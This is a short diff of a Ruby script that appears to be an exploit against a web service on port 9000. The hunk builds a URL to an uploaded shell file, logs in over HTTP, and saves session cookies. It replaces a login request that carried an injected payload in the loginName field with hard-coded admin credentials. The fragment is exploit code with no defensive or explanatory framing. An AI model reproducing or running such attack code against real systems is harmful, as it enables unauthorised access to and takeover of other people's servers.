@@ -160,7 +160,7 @@ uri2 = URI.parse("http://#{rhost}:9000/#{shell_name}")
 Net::HTTP.start(uri2.host, uri2.port) do |http|
   puts "[*] Logging in"
   p_request  = Net::HTTP::Post.new(uri2)
-  p_request.set_form_data({"loginState"=>"checkLogin", "password"=>"Hola","loginName"=>"#{post_payload}"})
+  p_request.set_form_data({"loginName"=>"admin", "password"=>"P@ssw0rd"})
   p_response = http.request(p_request)
   cookies    = p_response.response['set-cookie']	# Save Cookies
   
